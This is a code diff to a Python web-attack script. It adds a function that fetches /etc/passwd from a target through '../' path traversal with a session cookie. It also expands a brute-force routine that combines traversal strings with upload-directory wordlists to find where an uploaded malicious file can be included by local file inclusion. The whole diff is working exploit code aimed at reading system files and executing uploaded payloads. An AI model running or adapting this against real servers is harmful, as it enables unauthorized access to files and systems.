@@ -4,24 +4,49 @@ import requests
 import urllib.parse
 
 
-def brute_force_lfi(lfi_url_base, payload_relative, session, COOKIE):
-    with open("lfi_combi.txt", "r") as f:
-        file_data = f.read()
+def show_passwd(target_url, COOKIE):
+    print("Attempting to show /etc/passwd...")
 
-    lfi_combis = file_data.strip().split("\n")
+    passwd_dir = "../../../../../../etc/passwd"
+    response = requests.get(target_url + passwd_dir, cookies=COOKIE)
 
-    for combi in lfi_combis:
-        for depth in range(1, 10):
-            traversal = combi * depth
-            test_url = f"{lfi_url_base}{traversal}{payload_relative}"
-            print(f"[*] Trying LFI URL: {test_url}")
-            try:
-                response = session.get(test_url, cookies=COOKIE)
-                if "[+] Malicious file uploaded successfully!" in response.text:
-                    print(f"[+] Successfully included payload: {test_url}")
-                    return test_url
-            except Exception as e:
-                print(f"[-] Error testing {test_url}: {str(e)}")
+    if response.status_code == 200:
+        print(response.text)
+        return True
+    else:
+        print("FAILED")
+        return False
+
+
+def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
+
+    with open("upload_dir_wordlist.txt", "r") as f:
+        payload_relatives = [
+            line.strip() for line in f if not line.strip().startswith("#")
+        ]
+
+    with open("traversal_small.txt", "r") as f:
+        lfi_combis = f.read().strip().split("\n")
+
+    for payload_relative in payload_relatives:
+        for combi in lfi_combis:
+            for depth in range(1, 6):
+                traversal = combi * depth
+                test_url = (
+                    f"{lfi_url_base}{traversal}{payload_relative}{payload_filename}"
+                )
+                print(f"[*] Trying LFI URL: {test_url}")
+                try:
+                    response = session.get(test_url, cookies=COOKIE)
+                    print(response.status_code)
+                    if (
+                        "[+] Malicious file uploaded successfully!" in response.text
+                    ) or ("File not found." not in response.text):
+                        print(f"[+] Successfully included payload: {test_url}")
+                        return test_url
+                except Exception as e:
+                    print(f"[-] Error testing {test_url}: {str(e)}")
+
     return None
 
 
